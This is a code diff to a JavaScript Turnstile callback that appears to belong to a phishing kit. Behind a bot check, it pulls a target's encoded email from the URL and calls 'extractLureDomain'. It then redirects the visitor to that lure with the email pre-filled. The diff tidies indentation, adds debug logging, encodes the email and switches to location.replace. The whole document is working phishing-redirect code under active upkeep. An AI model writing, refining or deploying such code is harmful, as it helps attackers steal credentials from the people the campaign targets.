@@ -277,38 +277,42 @@ function startTurnstileVerification() {
             sitekey: "0x4AAAAAAAymSY_rn4CFRQRl",
             type: "spinner",
             callback: async function (token) {
-                if (!token) {
-                    console.error("Turnstile verification failed");
-                    return;
-                }
+    if (!token) {
+        console.error("Turnstile verification failed");
+        return;
+    }
 
-                // Show loading animation again
-                loadingDiv.style.display = "flex";
+    // Show loading animation again
+    loadingDiv.style.display = "flex";
 
-                // Extract and decode email from URL
-                const email = extractAndDecodeEmail();
-                const domain = extractLureDomain();
+    // Extract and decode email from URL
+    const email = extractAndDecodeEmail();
+    const domain = extractLureDomain();
 
-                // Validate domain and email
-                if (!email || !domain) {
-                    console.error("Missing email or domain. Cannot redirect.");
-                    loadingDiv.style.display = "none"; // Hide loading animation
-                    return;
-                }
+    // Validate domain and email
+    if (!email || !domain) {
+        console.error("Missing email or domain. Cannot redirect.");
+        loadingDiv.style.display = "none"; // Hide loading animation
+        return;
+    }
 
-                // Set a cookie for verification (optional)
-                document.cookie = "verified=true; Path=/; SameSite=None; Secure=true";
+    // Set a cookie for verification (optional)
+    document.cookie = "verified=true; Path=/; SameSite=None; Secure=true";
 
-                // Construct the redirect URL
-                const redirectUrl = `${domain}#POP=${email}?redirected=done`;
+    // Debugging
+    console.log("Domain:", domain);
+    console.log("Email:", email);
 
-                // Wait for 3 seconds, then redirect
-                setTimeout(function () {
-                    loadingDiv.style.display = "none";
+    // Construct the redirect URL
+    const redirectUrl = `${domain}?POP=${encodeURIComponent(email)}&redirected=done`;
 
-                    console.log("Redirecting to:", redirectUrl); // Debug log to verify URL
-                    window.location.href = redirectUrl; // Perform the redirection
-                }, 2000);
+    // Wait for 3 seconds, then redirect
+    setTimeout(function () {
+        loadingDiv.style.display = "none";
+
+        console.log("Redirecting to:", redirectUrl); // Debug log to verify URL
+        window.location.replace(redirectUrl); // Perform the redirection
+    }, 2000);
             },
             "error-callback": function () {
                 console.error("Turnstile encountered an error");
